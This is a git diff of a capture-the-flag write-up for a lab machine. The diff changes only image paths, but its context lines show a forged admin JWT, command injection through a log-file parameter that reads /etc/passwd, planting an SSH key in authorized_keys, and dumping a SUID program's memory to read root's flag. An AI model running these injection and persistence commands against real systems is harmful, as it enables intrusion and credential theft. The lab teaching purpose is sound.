@@ -1,4 +1,4 @@
-![[banner.png]]
+![[./images/banner.png]]
 
 ### System Scan
 
@@ -140,7 +140,7 @@ Before moving on, it’s best to check that there is in the face a working API a
 
 Going to `[<http://10.10.11.120/api/priv>](<http://10.10.11.120/api/priv>)` in Firefox returns an **Access Denied** result. According to the documentation, this is expected.
 
-![[first.png]]
+![[./images/first.png]]
 
 There is a working implementation of this API operational on the website, and documentation on how to operate it! Plus the source code to hunt for vulnerabilities. A gold mine! Time to start hunting.
 
@@ -253,7 +253,7 @@ The three main ways to bypass JWT validation:
 
 Let’s start by changing the `alg`, looking at the code, there isn’t an alg specified. `[JWT.io](<http://JWT.io>)` is a great place to inspect and modify JWTs
 
-![[second.png]]
+![[./images/second.png]]
 
 Try changing the `alg` param to `none` but to no avail. Other attempts were `NONE`, `nOnE`, `NOne`, etc. Also to no avail.
 
@@ -267,11 +267,11 @@ In the initial look at the files, hidden files were overlooked. There are two hi
 
 Looking at the `.env` file, there is a `TOKEN_SECRET` that is used to encrypt the JWTs. According to `.env`, it's _secret_. Going back to [jwt.io](https://jwt.io/) there’s a box to enter the secret into the HMACSHA256, adding in _secret_, there is now a valid token to use.
 
-![[third.png]]
+![[./images/third.png]]
 
 Using that to access `/api/priv` still is rejected, saying the token is invalid! This means the `TOKEN_SECRET` is wrong!
 
-![[fourth.png]]
+![[./images/fourth.png]]
 
 There was also a `.git` folder. We can look back and see the history of the source code changes. Running a `git log` on the source code, there's an interesting commit message.
 
@@ -283,7 +283,7 @@ Interestingly enough, the `.env` file is still there. To go back in time and s
 [user@parrot]~$ git diff HEAD~2
 ```
 
-![[fifth.png]]
+![[./images/fifth.png]]
 
 FINALLY! Go back to [JWT.io](http://JWT.io), change the `name`  field to `theadmin`  and paste the key within the HMAC secret. Test the newly created JWT against `/api/priv`  endpoint to ensure the bypass worked.
 
@@ -299,7 +299,7 @@ The full URL will be: [http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/pa
 [user@parrot]~$ curl -i '\\n' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjFlMTU1MmM5ZTZlYjA0NjFjOWE1ZGIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5pa2tAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2MTM4ODYzfQ.7fwnTwm0Ze-63VU-K-fVIochFfesOjlvi6S-DTHJJek' '<http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/passwd>' | sed 's/\\\\n/\\n/g'
 ```
 
-![[sixth.png]]
+![[./images/sixth.png]]
 
 Great news, the user running the application is a real user with a login shell. From here, it’s possible to create a reverse shell and start enumerating, but reverse shells are rough to work with. Reviewing the open ports from `nmap` again, SSH is running. I always say if you can SSH in, do it! To do this, add an SSH public key to `authorized_machines`  file of the user's home directory.
 
@@ -309,7 +309,7 @@ In a real engagement, don’t use your machine's main SSH key. Always generate a
 [user@parrot]~$ ssh-keygen -t rsa -b 4096 -C 'nikkuser@htb' -f 10.10.11.120 -P ''
 ```
 
-![[seventh.png]]
+![[./images/seventh.png]]
 
 This command generates a new SSH public and private key in your current directory named `10.10.11.120`.
 
@@ -324,7 +324,7 @@ First, store the contents of your public key into a bash variable:
 [user@parrot]~$ curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjFlMTU1MmM5ZTZlYjA0NjFjOWE1ZGIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5pa2tAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2MTM4ODYzfQ.7fwnTwm0Ze-63VU-K-fVIochFfesOjlvi6S-DTHJJek' -G --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys" '<http://10.10.11.120/api/logs>'
 ```
 
-![[eigth.png]]
+![[./images/eigth.png]]
 
 Receiving a 200 indicates that our test probably worked! SSH into the box.
 
@@ -332,7 +332,7 @@ Receiving a 200 indicates that our test probably worked! SSH into the box.
 [user@parrot]~$ ssh -i 10.10.11.120 dasith@10.10.11.120
 ```
 
-![[nineth.png]]
+![[./images/nineth.png]]
 
 Get that user hash
 
@@ -350,7 +350,7 @@ This was the most difficult part of the box for me, and it took quite a while. H
 
 Before diving into the code, check out the program in action. Since we have the SUID bit enabled, we can run this application as its owner, in this case, `root`!
 
-![[tenth.png]]
+![[./images/tenth.png]]
 
 Enter `/root/root.txt` since that’s a file known to exist on this system. It has a similar output to the `wc` command, and there’s even an option to save the output to a file. Doing so only saves the count data, nothing about the actual file contents. Disappointing. Try again using the `/root` directory. This is great, there's access to `root`, but it needs to be leveraged into privilege escalation.
 
@@ -362,7 +362,7 @@ Been a long time since I’ve worked in C. Going through, there’s a spot where
 
 Looking at the code again, we see that the file requested is read into memory. That means we can try to use `gdb` or `strace` to run the application and dump the memory as we use the file
 
-![[eleventh.png]]
+![[./images/eleventh.png]]
 
 Sadly, the SUID bit doesn’t hold when ran through those programs. After some research, apparently that’s standard Linux security. However, there is another method we can take
 
@@ -372,9 +372,9 @@ Leveraging Core Dump. This is usually not enabled by default, but having valgrin
 
 The plan is to execute the program, have it read the file into memory, and then purposefully crash the program. Causing a core dump will dump the contents of the applications memory to a file.
 
-![[twelth.png]]
+![[./images/twelth.png]]
 
-![[thirteenth.png]]
+![[./images/thirteenth.png]]
 
 Run the application and access `/root/root.txt`. When the application asks to save the contents to a file, press `CTRL` + `z` to push the application in the background. Next, run `ps` to get the PID of the application.
 
@@ -386,7 +386,7 @@ Never thought it’d be so great to break a program. The core dump files are loc
 [user@parrot]~$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-report
 ```
 
-![[fourteenth.png]]
+![[./images/fourteenth.png]]
 
 You can use `less` to view the core dump, but its a binary file and the data is hard to sift through. `xxd` would be a good option, but since we’re looking for the flag, using the `strings` command is the best call.
 
@@ -402,7 +402,7 @@ Now, this is all fine and dandy, but have you really rooted the box? You got the
 
 Grab the key from the terminal, copy-paste onto your local box, and GOGOGO
 
-![[last.png]]
+![[./images/last.png]]
 
 ### Conclusion
 
